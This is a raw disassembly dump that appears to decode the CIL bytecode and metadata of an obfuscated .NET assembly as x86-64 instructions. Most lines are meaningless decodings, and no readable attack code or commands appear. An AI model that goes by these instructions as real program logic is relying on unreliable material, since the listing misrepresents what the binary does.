  407247:	02 00                	add    (%rax),%al
  407249:	6f                   	outsl  (%rsi),(%dx)
  40724a:	2f                   	(bad)
  40724b:	00 00                	add    %al,(%rax)
  40724d:	0a 2a                	or     (%rdx),%ch
  40724f:	00 6a 2b             	add    %ch,0x2b(%rdx)
  407252:	02 26                	add    (%rsi),%ah
  407254:	16                   	(bad)
  407255:	fe 09                	decb   (%rcx)
  407257:	00 00                	add    %al,(%rax)
  407259:	fe 09                	decb   (%rcx)
  40725b:	01 00                	add    %eax,(%rax)
  40725d:	fe 09                	decb   (%rcx)
  40725f:	02 00                	add    (%rax),%al
  407261:	fe 09                	decb   (%rcx)
  407263:	03 00                	add    (%rax),%eax
  407265:	6f                   	outsl  (%rsi),(%dx)
  407266:	33 00                	xor    (%rax),%eax
  407268:	00 0a                	add    %cl,(%rdx)
  40726a:	2a 00                	sub    (%rax),%al
  40726c:	3a 2b                	cmp    (%rbx),%ch
  40726e:	02 26                	add    (%rsi),%ah
  407270:	16                   	(bad)
  407271:	fe 09                	decb   (%rcx)
  407273:	00 00                	add    %al,(%rax)
  407275:	6f                   	outsl  (%rsi),(%dx)
  407276:	6f                   	outsl  (%rsi),(%dx)
  407277:	00 00                	add    %al,(%rax)
  407279:	0a 2a                	or     (%rdx),%ch
  40727b:	00 3a                	add    %bh,(%rdx)
  40727d:	2b 02                	sub    (%rdx),%eax
  40727f:	26 16                	es (bad)
  407281:	fe 09                	decb   (%rcx)
  407283:	00 00                	add    %al,(%rax)
  407285:	6f                   	outsl  (%rsi),(%dx)
  407286:	35 00 00 0a 2a       	xor    $0x2a0a0000,%eax
  40728b:	00 3a                	add    %bh,(%rdx)
  40728d:	2b 02                	sub    (%rdx),%eax
  40728f:	26 16                	es (bad)
  407291:	fe 09                	decb   (%rcx)
  407293:	00 00                	add    %al,(%rax)
  407295:	6f                   	outsl  (%rsi),(%dx)
  407296:	34 00                	xor    $0x0,%al
  407298:	00 0a                	add    %cl,(%rdx)
  40729a:	2a 00                	sub    (%rax),%al
  40729c:	4e 2b 02             	rex.WRX sub (%rdx),%r8
  40729f:	26 16                	es (bad)
  4072a1:	00 fe                	add    %bh,%dh
  4072a3:	09 00                	or     %eax,(%rax)
  4072a5:	00 fe                	add    %bh,%dh
  4072a7:	09 01                	or     %eax,(%rcx)
  4072a9:	00 28                	add    %ch,(%rax)
  4072ab:	70 00                	jo     0x4072ad
  4072ad:	00 0a                	add    %cl,(%rdx)
  4072af:	2a 2e                	sub    (%rsi),%ch
  4072b1:	2b 02                	sub    (%rdx),%eax
  4072b3:	26 16                	es (bad)
  4072b5:	00 28                	add    %ch,(%rax)
  4072b7:	57                   	push   %rdi
  4072b8:	00 00                	add    %al,(%rax)
  4072ba:	0a 2a                	or     (%rdx),%ch
  4072bc:	6a 2b                	push   $0x2b
  4072be:	02 26                	add    (%rsi),%ah
  4072c0:	16                   	(bad)
  4072c1:	fe 09                	decb   (%rcx)
  4072c3:	00 00                	add    %al,(%rax)
  4072c5:	fe 09                	decb   (%rcx)
  4072c7:	01 00                	add    %eax,(%rax)
  4072c9:	fe 09                	decb   (%rcx)
  4072cb:	02 00                	add    (%rax),%al
  4072cd:	fe 09                	decb   (%rcx)
  4072cf:	03 00                	add    (%rax),%eax
  4072d1:	6f                   	outsl  (%rsi),(%dx)
  4072d2:	58                   	pop    %rax
  4072d3:	00 00                	add    %al,(%rax)
  4072d5:	0a 2a                	or     (%rdx),%ch
  4072d7:	00 1a                	add    %bl,(%rdx)
  4072d9:	2b 02                	sub    (%rdx),%eax
  4072db:	26 16                	es (bad)
  4072dd:	17                   	(bad)
  4072de:	2a 00                	sub    (%rax),%al
  4072e0:	1a 2b                	sbb    (%rbx),%ch
  4072e2:	02 26                	add    (%rsi),%ah
  4072e4:	16                   	(bad)
  4072e5:	16                   	(bad)
  4072e6:	2a 00                	sub    (%rax),%al
  4072e8:	52                   	push   %rdx
  4072e9:	2b 02                	sub    (%rdx),%eax
  4072eb:	26 16                	es (bad)
  4072ed:	2b 02                	sub    (%rdx),%eax
  4072ef:	26 16                	es (bad)
  4072f1:	28 50 00             	sub    %dl,0x0(%rax)
  4072f4:	00 06                	add    %al,(%rsi)
  4072f6:	02 28                	add    (%rax),%ch
  4072f8:	71 00                	jno    0x4072fa
  4072fa:	00 0a                	add    %cl,(%rdx)
  4072fc:	2a 00                	sub    (%rax),%al
  4072fe:	00 00                	add    %al,(%rax)
  407300:	52                   	push   %rdx
  407301:	2b 02                	sub    (%rdx),%eax
  407303:	26 16                	es (bad)
  407305:	2b 02                	sub    (%rdx),%eax
  407307:	26 16                	es (bad)
  407309:	28 50 00             	sub    %dl,0x0(%rax)
  40730c:	00 06                	add    %al,(%rsi)
  40730e:	02 28                	add    (%rax),%ch
  407310:	3b 00                	cmp    (%rax),%eax
  407312:	00 0a                	add    %cl,(%rdx)
  407314:	2a 00                	sub    (%rax),%al
  407316:	00 00                	add    %al,(%rax)
  407318:	13 30                	adc    (%rax),%esi
  40731a:	05 00 85 00 00       	add    $0x8500,%eax
  40731f:	00 0f                	add    %cl,(%rdi)
  407321:	00 00                	add    %al,(%rax)
  407323:	11 2b                	adc    %ebp,(%rbx)
  407325:	02 26                	add    (%rsi),%ah
  407327:	16                   	(bad)
  407328:	28 57 00             	sub    %dl,0x0(%rdi)
  40732b:	00 0a                	add    %cl,(%rdx)
  40732d:	02 6f 29             	add    0x29(%rdi),%ch
  407330:	00 00                	add    %al,(%rax)
  407332:	0a 0a                	or     (%rdx),%cl
  407334:	06                   	(bad)
  407335:	0b 1f                	or     (%rdi),%ebx
  407337:	20 8d 11 00 00 01    	and    %cl,0x1000011(%rbp)
  40733d:	25 d0 2a 00 00       	and    $0x2ad0,%eax
  407342:	04 28                	add    $0x28,%al
  407344:	47 00 00             	rex.RXB add %r8b,(%r8)
  407347:	0a 0c 28             	or     (%rax,%rbp,1),%cl
  40734a:	57                   	push   %rdi
  40734b:	00 00                	add    %al,(%rax)
  40734d:	0a 03                	or     (%rbx),%al
  40734f:	6f                   	outsl  (%rsi),(%dx)
  407350:	29 00                	sub    %eax,(%rax)
  407352:	00 0a                	add    %cl,(%rdx)
  407354:	28 1a                	sub    %bl,(%rdx)
  407356:	00 00                	add    %al,(%rax)
  407358:	06                   	(bad)
  407359:	0d 73 31 00 00       	or     $0x3173,%eax
  40735e:	0a 13                	or     (%rbx),%dl
  407360:	04 28                	add    $0x28,%al
  407362:	18 00                	sbb    %al,(%rax)
  407364:	00 06                	add    %al,(%rsi)
  407366:	13 05 11 05 08 6f    	adc    0x6f080511(%rip),%eax        # 0x6f48787d
  40736c:	65 00 00             	add    %al,%gs:(%rax)
  40736f:	0a 11                	or     (%rcx),%dl
  407371:	05 09 6f 66 00       	add    $0x666f09,%eax
  407376:	00 0a                	add    %cl,(%rdx)
  407378:	11 04 11             	adc    %eax,(%rcx,%rdx,1)
  40737b:	05 6f 72 00 00       	add    $0x726f,%eax
  407380:	0a 17                	or     (%rdi),%dl
  407382:	73 32                	jae    0x4073b6
  407384:	00 00                	add    %al,(%rax)
  407386:	0a 13                	or     (%rbx),%dl
  407388:	06                   	(bad)
  407389:	11 06                	adc    %eax,(%rsi)
  40738b:	07                   	(bad)
  40738c:	16                   	(bad)
  40738d:	07                   	(bad)
  40738e:	8e 69 6f             	mov    0x6f(%rcx),%gs
  407391:	33 00                	xor    (%rax),%eax
  407393:	00 0a                	add    %cl,(%rdx)
  407395:	11 06                	adc    %eax,(%rsi)
  407397:	6f                   	outsl  (%rsi),(%dx)
  407398:	34 00                	xor    $0x0,%al
  40739a:	00 0a                	add    %cl,(%rdx)
  40739c:	11 04 6f             	adc    %eax,(%rdi,%rbp,2)
  40739f:	35 00 00 0a 28       	xor    $0x280a0000,%eax
  4073a4:	73 00                	jae    0x4073a6
  4073a6:	00 0a                	add    %cl,(%rdx)
  4073a8:	2a 00                	sub    (%rax),%al
  4073aa:	00 00                	add    %al,(%rax)
  4073ac:	52                   	push   %rdx
  4073ad:	2b 02                	sub    (%rdx),%eax
  4073af:	26 16                	es (bad)
  4073b1:	2b 02                	sub    (%rdx),%eax
  4073b3:	26 16                	es (bad)
  4073b5:	28 50 00             	sub    %dl,0x0(%rax)
  4073b8:	00 06                	add    %al,(%rsi)
  4073ba:	02 28                	add    (%rax),%ch
  4073bc:	3b 00                	cmp    (%rax),%eax
  4073be:	00 0a                	add    %cl,(%rdx)
  4073c0:	2a 00                	sub    (%rax),%al
  4073c2:	00 00                	add    %al,(%rax)
  4073c4:	16                   	(bad)
  4073c5:	2b 02                	sub    (%rdx),%eax
  4073c7:	26 16                	es (bad)
  4073c9:	2a 00                	sub    (%rax),%al
  4073cb:	00 3e                	add    %bh,(%rsi)
  4073cd:	2b 02                	sub    (%rdx),%eax
  4073cf:	26 16                	es (bad)
  4073d1:	2b 02                	sub    (%rdx),%eax
  4073d3:	26 16                	es (bad)
  4073d5:	02 28                	add    (%rax),%ch
  4073d7:	3b 00                	cmp    (%rax),%eax
  4073d9:	00 0a                	add    %cl,(%rdx)
  4073db:	2a 26                	sub    (%rsi),%ah
  4073dd:	2b 02                	sub    (%rdx),%eax
  4073df:	26 16                	es (bad)
  4073e1:	2b 02                	sub    (%rdx),%eax
  4073e3:	26 16                	es (bad)
  4073e5:	2a 00                	sub    (%rax),%al
  4073e7:	00 42 53             	add    %al,0x53(%rdx)
  4073ea:	4a                   	rex.WX
  4073eb:	42 01 00             	rex.X add %eax,(%rax)
  4073ee:	01 00                	add    %eax,(%rax)
  4073f0:	00 00                	add    %al,(%rax)
  4073f2:	00 00                	add    %al,(%rax)
  4073f4:	0c 00                	or     $0x0,%al
  4073f6:	00 00                	add    %al,(%rax)
  4073f8:	76 34                	jbe    0x40742e
  4073fa:	2e 30 2e             	cs xor %ch,(%rsi)
  4073fd:	33 30                	xor    (%rax),%esi
  4073ff:	33 31                	xor    (%rcx),%esi
  407401:	39 00                	cmp    %eax,(%rax)
  407403:	00 00                	add    %al,(%rax)
  407405:	00 05 00 6c 00 00    	add    %al,0x6c00(%rip)        # 0x40e00b
  40740b:	00 d8                	add    %bl,%al
  40740d:	0f 00 00             	sldt   (%rax)
  407410:	23 7e 00             	and    0x0(%rsi),%edi
  407413:	00 44 10 00          	add    %al,0x0(%rax,%rdx,1)
  407417:	00 54 13 00          	add    %dl,0x0(%rbx,%rdx,1)
  40741b:	00 23                	add    %ah,(%rbx)
  40741d:	53                   	push   %rbx
  40741e:	74 72                	je     0x407492
  407420:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%rsi),%ebp
  407427:	00 98 23 00 00 c4    	add    %bl,-0x3bffffdd(%rax)
  40742d:	03 00                	add    (%rax),%eax
  40742f:	00 23                	add    %ah,(%rbx)
  407431:	55                   	push   %rbp
  407432:	53                   	push   %rbx
  407433:	00 5c 27 00          	add    %bl,0x0(%rdi,%riz,1)
  407437:	00 10                	add    %dl,(%rax)
  407439:	00 00                	add    %al,(%rax)
  40743b:	00 23                	add    %ah,(%rbx)
  40743d:	47 55                	rex.RXB push %r13
  40743f:	49                   	rex.WB
  407440:	44 00 00             	add    %r8b,(%rax)
  407443:	00 6c 27 00          	add    %ch,0x0(%rdi,%riz,1)
  407447:	00 08                	add    %cl,(%rax)
  407449:	06                   	(bad)
  40744a:	00 00                	add    %al,(%rax)
  40744c:	23 42 6c             	and    0x6c(%rdx),%eax
  40744f:	6f                   	outsl  (%rsi),(%dx)
  407450:	62                   	(bad)
  407451:	00 00                	add    %al,(%rax)
  407453:	00 00                	add    %al,(%rax)
  407455:	00 00                	add    %al,(%rax)
  407457:	00 02                	add    %al,(%rdx)
  407459:	00 00                	add    %al,(%rax)
  40745b:	01 57 bd             	add    %edx,-0x43(%rdi)
  40745e:	02 28                	add    (%rax),%ch
  407460:	09 07                	or     %eax,(%rdi)
	...
  40746a:	00 00                	add    %al,(%rax)
  40746c:	01 00                	add    %eax,(%rax)
  40746e:	00 00                	add    %al,(%rax)
  407470:	5a                   	pop    %rdx
  407471:	00 00                	add    %al,(%rax)
  407473:	00 17                	add    %dl,(%rdi)
  407475:	00 00                	add    %al,(%rax)
  407477:	00 2c 00             	add    %ch,(%rax,%rax,1)
  40747a:	00 00                	add    %al,(%rax)
  40747c:	52                   	push   %rdx
  40747d:	00 00                	add    %al,(%rax)
  40747f:	00 53 00             	add    %dl,0x0(%rbx)
  407482:	00 00                	add    %al,(%rax)
  407484:	76 00                	jbe    0x407486
  407486:	00 00                	add    %al,(%rax)
  407488:	01 00                	add    %eax,(%rax)
  40748a:	00 00                	add    %al,(%rax)
  40748c:	12 00                	adc    (%rax),%al
  40748e:	00 00                	add    %al,(%rax)
  407490:	02 00                	add    (%rax),%al
  407492:	00 00                	add    %al,(%rax)
  407494:	07                   	(bad)
  407495:	00 00                	add    %al,(%rax)
  407497:	00 0f                	add    %cl,(%rdi)
  407499:	00 00                	add    %al,(%rax)
  40749b:	00 01                	add    %al,(%rcx)
  40749d:	00 00                	add    %al,(%rax)
  40749f:	00 08                	add    %cl,(%rax)
  4074a1:	00 00                	add    %al,(%rax)
  4074a3:	00 01                	add    %al,(%rcx)
  4074a5:	00 00                	add    %al,(%rax)
  4074a7:	00 04 00             	add    %al,(%rax,%rax,1)
  4074aa:	00 00                	add    %al,(%rax)
  4074ac:	03 00                	add    (%rax),%eax
  4074ae:	00 00                	add    %al,(%rax)
  4074b0:	0f 00 00             	sldt   (%rax)
  4074b3:	00 01                	add    %al,(%rcx)
  4074b5:	00 00                	add    %al,(%rax)
  4074b7:	00 00                	add    %al,(%rax)
  4074b9:	00 36                	add    %dh,(%rsi)
  4074bb:	01 01                	add    %eax,(%rcx)
  4074bd:	00 00                	add    %al,(%rax)
  4074bf:	00 00                	add    %al,(%rax)
  4074c1:	00 06                	add    %al,(%rsi)
  4074c3:	00 11                	add    %dl,(%rcx)
  4074c5:	00 28                	add    %ch,(%rax)
  4074c7:	00 06                	add    %al,(%rsi)
  4074c9:	00 49 00             	add    %cl,0x0(%rcx)
  4074cc:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  4074cf:	00 55 00             	add    %dl,0x0(%rbp)
  4074d2:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  4074d5:	00 5c 00 28          	add    %bl,0x28(%rax,%rax,1)
  4074d9:	00 06                	add    %al,(%rsi)
  4074db:	00 79 00             	add    %bh,0x0(%rcx)
  4074de:	28 00                	sub    %al,(%rax)
  4074e0:	06                   	(bad)
  4074e1:	00 92 00 28 00 06    	add    %dl,0x6002800(%rdx)
  4074e7:	00 ad 00 28 00 06    	add    %ch,0x6002800(%rbp)
  4074ed:	00 ca                	add    %cl,%dl
  4074ef:	00 ea                	add    %ch,%dl
  4074f1:	00 06                	add    %al,(%rsi)
  4074f3:	00 0a                	add    %cl,(%rdx)
  4074f5:	01 4e 00             	add    %ecx,0x0(%rsi)
  4074f8:	06                   	(bad)
  4074f9:	00 10                	add    %dl,(%rax)
  4074fb:	01 4e 00             	add    %ecx,0x0(%rsi)
  4074fe:	06                   	(bad)
  4074ff:	00 18                	add    %bl,(%rax)
  407501:	01 ea                	add    %ebp,%edx
  407503:	00 06                	add    %al,(%rsi)
  407505:	00 79 01             	add    %bh,0x1(%rcx)
  407508:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  40750b:	00 fd                	add    %bh,%ch
  40750d:	01 4e 00             	add    %ecx,0x0(%rsi)
  407510:	06                   	(bad)
  407511:	00 48 02             	add    %cl,0x2(%rax)
  407514:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  407517:	00 b3 02 4e 00 06    	add    %dh,0x6004e02(%rbx)
  40751d:	00 d0                	add    %dl,%al
  40751f:	02 4e 00             	add    0x0(%rsi),%cl
  407522:	06                   	(bad)
  407523:	00 2c 04             	add    %ch,(%rsp,%rax,1)
  407526:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  407529:	00 67 04             	add    %ah,0x4(%rdi)
  40752c:	6c                   	insb   (%dx),(%rdi)
  40752d:	04 06                	add    $0x6,%al
  40752f:	00 83 04 4e 00 06    	add    %al,0x6004e04(%rbx)
  407535:	00 94 04 4e 00 0a 00 	add    %dl,0xa004e(%rsp,%rax,1)
  40753c:	ae                   	scas   (%rdi),%al
  40753d:	04 c0                	add    $0xc0,%al
  40753f:	04 0a                	add    $0xa,%al
  407541:	00 d2                	add    %dl,%dl
  407543:	04 c0                	add    $0xc0,%al
  407545:	04 0a                	add    $0xa,%al
  407547:	00 e2                	add    %ah,%dl
  407549:	04 c0                	add    $0xc0,%al
  40754b:	04 0a                	add    $0xa,%al
  40754d:	00 fd                	add    %bh,%ch
  40754f:	04 c0                	add    $0xc0,%al
  407551:	04 0e                	add    $0xe,%al
  407553:	00 0e                	add    %cl,(%rsi)
  407555:	05 1f 05 5f 00       	add    $0x5f051f,%eax
  40755a:	32 05 00 00 0a 00    	xor    0xa0000(%rip),%al        # 0x4a7560
  407560:	5f                   	pop    %rdi
  407561:	05 c0 04 0a 00       	add    $0xa04c0,%eax
  407566:	7a 05                	jp     0x40756d
  407568:	c0 04 0a 00          	rolb   $0x0,(%rdx,%rcx,1)
  40756c:	86 05 c0 04 0a 00    	xchg   %al,0xa04c0(%rip)        # 0x4a7a32
  407572:	bd 05 c0 04 06       	mov    $0x604c005,%ebp
  407577:	00 eb                	add    %ch,%bl
  407579:	05 4e 00 06 00       	add    $0x6004e,%eax
  40757e:	07                   	(bad)
  40757f:	06                   	(bad)
  407580:	4e 00 0e             	rex.WRX add %r9b,(%rsi)
  407583:	00 68 06             	add    %ch,0x6(%rax)
  407586:	1f                   	(bad)
  407587:	05 06 00 7b 06       	add    $0x67b0006,%eax
  40758c:	6c                   	insb   (%dx),(%rdi)
  40758d:	04 0e                	add    $0xe,%al
  40758f:	00 b9 06 1f 05 06    	add    %bh,0x6051f06(%rcx)
  407595:	00 c7                	add    %al,%bh
  407597:	06                   	(bad)
  407598:	ce                   	(bad)
  407599:	06                   	(bad)
  40759a:	06                   	(bad)
  40759b:	00 08                	add    %cl,(%rax)
  40759d:	07                   	(bad)
  40759e:	11 07                	adc    %eax,(%rdi)
  4075a0:	06                   	(bad)
  4075a1:	00 27                	add    %ah,(%rdi)
  4075a3:	07                   	(bad)
  4075a4:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  4075a7:	00 84 07 97 07 06 00 	add    %al,0x60797(%rdi,%rax,1)
  4075ae:	b4 07                	mov    $0x7,%ah
  4075b0:	97                   	xchg   %eax,%edi
  4075b1:	07                   	(bad)
  4075b2:	06                   	(bad)
  4075b3:	00 c4                	add    %al,%ah
  4075b5:	07                   	(bad)
  4075b6:	97                   	xchg   %eax,%edi
  4075b7:	07                   	(bad)
  4075b8:	06                   	(bad)
  4075b9:	00 d5                	add    %dl,%ch
  4075bb:	07                   	(bad)
  4075bc:	6c                   	insb   (%dx),(%rdi)
  4075bd:	04 06                	add    $0x6,%al
  4075bf:	00 e2                	add    %ah,%dl
  4075c1:	07                   	(bad)
  4075c2:	97                   	xchg   %eax,%edi
  4075c3:	07                   	(bad)
  4075c4:	06                   	(bad)
  4075c5:	00 f8                	add    %bh,%al
  4075c7:	07                   	(bad)
  4075c8:	97                   	xchg   %eax,%edi
  4075c9:	07                   	(bad)
  4075ca:	06                   	(bad)
  4075cb:	00 20                	add    %ah,(%rax)
  4075cd:	08 97 07 06 00 2b    	or     %dl,0x2b000607(%rdi)
  4075d3:	08 97 07 06 00 57    	or     %dl,0x57000607(%rdi)
  4075d9:	08 6c 04 06          	or     %ch,0x6(%rsp,%rax,1)
  4075dd:	00 5e 08             	add    %bl,0x8(%rsi)
  4075e0:	97                   	xchg   %eax,%edi
  4075e1:	07                   	(bad)
  4075e2:	4f 00 13             	rex.WRXB add %r10b,(%r11)
  4075e5:	09 00                	or     %eax,(%rax)
  4075e7:	00 06                	add    %al,(%rsi)
  4075e9:	00 33                	add    %dh,(%rbx)
  4075eb:	09 28                	or     %ebp,(%rax)
  4075ed:	00 06                	add    %al,(%rsi)
  4075ef:	00 50 09             	add    %dl,0x9(%rax)
  4075f2:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  4075f5:	00 55 09             	add    %dl,0x9(%rbp)
  4075f8:	28 00                	sub    %al,(%rax)
  4075fa:	06                   	(bad)
  4075fb:	00 5f 09             	add    %bl,0x9(%rdi)
  4075fe:	28 00                	sub    %al,(%rax)
  407600:	06                   	(bad)
  407601:	00 80 09 28 00 06    	add    %al,0x6002809(%rax)
  407607:	00 ab 09 28 00 06    	add    %ch,0x6002809(%rbx)
  40760d:	00 b6 09 4e 00 06    	add    %dh,0x6004e09(%rsi)
  407613:	00 e9                	add    %ch,%cl
  407615:	09 4e 00             	or     %ecx,0x0(%rsi)
  407618:	06                   	(bad)
  407619:	00 08                	add    %cl,(%rax)
  40761b:	0a 28                	or     (%rax),%ch
  40761d:	00 06                	add    %al,(%rsi)
  40761f:	00 26                	add    %ah,(%rsi)
  407621:	0a 4e 00             	or     0x0(%rsi),%cl
  407624:	06                   	(bad)
  407625:	00 42 0a             	add    %al,0xa(%rdx)
  407628:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  40762b:	00 4f 0a             	add    %cl,0xa(%rdi)
  40762e:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  407631:	00 00                	add    %al,(%rax)
  407633:	0b 0b                	or     (%rbx),%ecx
  407635:	0b 06                	or     (%rsi),%eax
  407637:	00 50 0b             	add    %dl,0xb(%rax)
  40763a:	0b 0b                	or     (%rbx),%ecx
  40763c:	06                   	(bad)
  40763d:	00 78 0b             	add    %bh,0xb(%rax)
  407640:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  407643:	00 9c 0b 4e 00 06 00 	add    %bl,0x6004e(%rbx,%rcx,1)
  40764a:	cb                   	lret
  40764b:	0b ea                	or     %edx,%ebp
  40764d:	00 06                	add    %al,(%rsi)
  40764f:	00 ea                	add    %ch,%dl
  407651:	0b 4e 00             	or     0x0(%rsi),%ecx
  407654:	06                   	(bad)
  407655:	00 f0                	add    %dh,%al
  407657:	0b 4e 00             	or     0x0(%rsi),%ecx
  40765a:	06                   	(bad)
  40765b:	00 08                	add    %cl,(%rax)
  40765d:	0c 97                	or     $0x97,%al
  40765f:	07                   	(bad)
  407660:	06                   	(bad)
  407661:	00 50 0c             	add    %dl,0xc(%rax)
  407664:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  407667:	00 57 0c             	add    %dl,0xc(%rdi)
  40766a:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  40766d:	00 73 0c             	add    %dh,0xc(%rbx)
  407670:	4e 00 12             	rex.WRX add %r10b,(%rdx)
  407673:	00 b6 0c 97 07 06    	add    %dh,0x607970c(%rsi)
  407679:	00 db                	add    %bl,%bl
  40767b:	0c 4e                	or     $0x4e,%al
  40767d:	00 06                	add    %al,(%rsi)
  40767f:	00 f4                	add    %dh,%ah
  407681:	0c 01                	or     $0x1,%al
  407683:	0d 06 00 2a 0d       	or     $0xd2a0006,%eax
  407688:	97                   	xchg   %eax,%edi
  407689:	07                   	(bad)
  40768a:	06                   	(bad)
  40768b:	00 5d 0d             	add    %bl,0xd(%rbp)
  40768e:	97                   	xchg   %eax,%edi
  40768f:	07                   	(bad)
  407690:	06                   	(bad)
  407691:	00 76 0d             	add    %dh,0xd(%rsi)
  407694:	97                   	xchg   %eax,%edi
  407695:	07                   	(bad)
  407696:	06                   	(bad)
  407697:	00 af 0d 6c 04 06    	add    %ch,0x6046c0d(%rdi)
  40769d:	00 f5                	add    %dh,%ch
  40769f:	0d fd 0d 06 00       	or     $0x60dfd,%eax
  4076a4:	45 0e                	rex.RB (bad)
  4076a6:	28 00                	sub    %al,(%rax)
  4076a8:	06                   	(bad)
  4076a9:	00 7b 0e             	add    %bh,0xe(%rbx)
  4076ac:	28 00                	sub    %al,(%rax)
  4076ae:	06                   	(bad)
  4076af:	00 9b 0e 6c 04 06    	add    %bl,0x6046c0e(%rbx)
  4076b5:	00 a6 0e 6c 04 06    	add    %ah,0x6046c0e(%rsi)
  4076bb:	00 af 0e 6c 04 06    	add    %ch,0x6046c0e(%rdi)
  4076c1:	00 ba 0e 6c 04 06    	add    %bh,0x6046c0e(%rdx)
  4076c7:	00 f6                	add    %dh,%dh
  4076c9:	12 fd                	adc    %ch,%bh
  4076cb:	0d 06 00 18 13       	or     $0x13180006,%eax
  4076d0:	fd                   	std
  4076d1:	0d 06 00 2a 13       	or     $0x132a0006,%eax
  4076d6:	4e 00 06             	rex.WRX add %r8b,(%rsi)
  4076d9:	00 39                	add    %bh,(%rcx)
  4076db:	13 ea                	adc    %edx,%ebp
  4076dd:	00 00                	add    %al,(%rax)
  4076df:	00 00                	add    %al,(%rax)
  4076e1:	00 4a 01             	add    %cl,0x1(%rdx)
  4076e4:	00 00                	add    %al,(%rax)
  4076e6:	00 00                	add    %al,(%rax)
  4076e8:	01 00                	add    %eax,(%rax)
  4076ea:	01 00                	add    %eax,(%rax)
  4076ec:	80 01 10             	addb   $0x10,(%rcx)
  4076ef:	00 53 01             	add    %dl,0x1(%rbx)
  4076f2:	66 01 31             	add    %si,(%rcx)
  4076f5:	00 01                	add    %al,(%rcx)
  4076f7:	00 01                	add    %al,(%rcx)
  4076f9:	00 01                	add    %al,(%rcx)
  4076fb:	00 10                	add    %dl,(%rax)
  4076fd:	00 80 01 00 00 31    	add    %al,0x31000001(%rax)
  407703:	00 01                	add    %al,(%rcx)
  407705:	00 01                	add    %al,(%rcx)
  407707:	00 00                	add    %al,(%rax)
  407709:	00 00                	add    %al,(%rax)
  40770b:	00 95 01 00 00 31    	add    %dl,0x31000001(%rbp)
  407711:	00 04 00             	add    %al,(%rax,%rax,1)
  407714:	08 00                	or     %al,(%rax)
  407716:	00 00                	add    %al,(%rax)
  407718:	10 00                	adc    %al,(%rax)
  40771a:	c4 01 d7 01          	(bad)
  40771e:	31 00                	xor    %eax,(%rax)
  407720:	04 00                	add    $0x0,%al
  407722:	08 00                	or     %al,(%rax)
  407724:	05 01 00 00 ea       	add    $0xea000001,%eax
  407729:	01 00                	add    %eax,(%rax)
  40772b:	00 35 00 05 00 0b    	add    %dh,0xb000500(%rip)        # 0xb407c31
  407731:	00 00                	add    %al,(%rax)
  407733:	00 00                	add    %al,(%rax)
  407735:	00 0f                	add    %cl,(%rdi)
  407737:	02 22                	add    (%rdx),%ah
  407739:	02 31                	add    (%rcx),%dh
  40773b:	00 05 00 0f 00 05    	add    %al,0x5000f00(%rip)        # 0x5408641
  407741:	00 10                	add    %dl,(%rax)
  407743:	00 35 02 00 00 39    	add    %dh,0x39000002(%rip)        # 0x3940774b
  407749:	00 21                	add    %ah,(%rcx)
  40774b:	00 44 00 05          	add    %al,0x5(%rax,%rax,1)
  40774f:	00 10                	add    %dl,(%rax)
  407751:	00 52 02             	add    %dl,0x2(%rdx)
  407754:	00 00                	add    %al,(%rax)
  407756:	31 00                	xor    %eax,(%rax)
  407758:	21 00                	and    %eax,(%rax)
  40775a:	45 00 05 00 10 00 67 	add    %r8b,0x67001000(%rip)        # 0x67408761
  407761:	02 00                	add    (%rax),%al
  407763:	00 31                	add    %dh,(%rcx)
  407765:	00 21                	add    %ah,(%rcx)
  407767:	00 46 00             	add    %al,0x0(%rsi)
  40776a:	05 01 00 00 7a       	add    $0x7a000001,%eax
  40776f:	02 00                	add    (%rax),%al
  407771:	00 35 00 21 00 48    	add    %dh,0x48002100(%rip)        # 0x48409877
  407777:	00 03                	add    %al,(%rbx)
  407779:	01 00                	add    %eax,(%rax)
  40777b:	00 8d 02 00 00 35    	add    %cl,0x35000002(%rbp)
  407781:	00 21                	add    %ah,(%rcx)
  407783:	00 4c 00 0d          	add    %cl,0xd(%rax,%rax,1)
  407787:	01 10                	add    %edx,(%rax)
  407789:	00 a0 02 00 00 3d    	add    %ah,0x3d000002(%rax)
  40778f:	00 21                	add    %ah,(%rcx)
  407791:	00 50 00             	add    %dl,0x0(%rax)
  407794:	03 01                	add    (%rcx),%eax
  407796:	00 00                	add    %al,(%rax)
  407798:	bd 02 00 00 41       	mov    $0x41000002,%ebp
  40779d:	00 23                	add    %ah,(%rbx)
  40779f:	00 50 00             	add    %dl,0x0(%rax)
  4077a2:	00 00                	add    %al,(%rax)
  4077a4:	10 00                	adc    %al,(%rax)
  4077a6:	d5 02 e8             	(bad)
  4077a9:	02 31                	add    (%rcx),%dh
  4077ab:	00 24 00             	add    %ah,(%rax,%rax,1)
  4077ae:	50                   	push   %rax
  4077af:	00 00                	add    %al,(%rax)
  4077b1:	00 00                	add    %al,(%rax)
  4077b3:	00 fb                	add    %bh,%bl
  4077b5:	02 00                	add    (%rax),%al
  4077b7:	00 31                	add    %dh,(%rcx)
  4077b9:	00 25 00 53 00 13    	add    %ah,0x13005300(%rip)        # 0x1340cabf
  4077bf:	01 00                	add    %eax,(%rax)
  4077c1:	00 40 03             	add    %al,0x3(%rax)
  4077c4:	00 00                	add    %al,(%rax)
  4077c6:	3d 00 2d 00 53       	cmp    $0x53002d00,%eax
  4077cb:	00 13                	add    %dl,(%rbx)
  4077cd:	01 00                	add    %eax,(%rax)
  4077cf:	00 5e 03             	add    %bl,0x3(%rsi)
  4077d2:	00 00                	add    %al,(%rax)
  4077d4:	3d 00 2d 00 53       	cmp    $0x53002d00,%eax
  4077d9:	00 13                	add    %dl,(%rbx)
  4077db:	01 00                	add    %eax,(%rax)
  4077dd:	00 7b 03             	add    %bh,0x3(%rbx)
  4077e0:	00 00                	add    %al,(%rax)
  4077e2:	3d 00 2d 00 53       	cmp    $0x53002d00,%eax
  4077e7:	00 13                	add    %dl,(%rbx)
  4077e9:	01 00                	add    %eax,(%rax)
  4077eb:	00 98 03 00 00 3d    	add    %bl,0x3d000003(%rax)
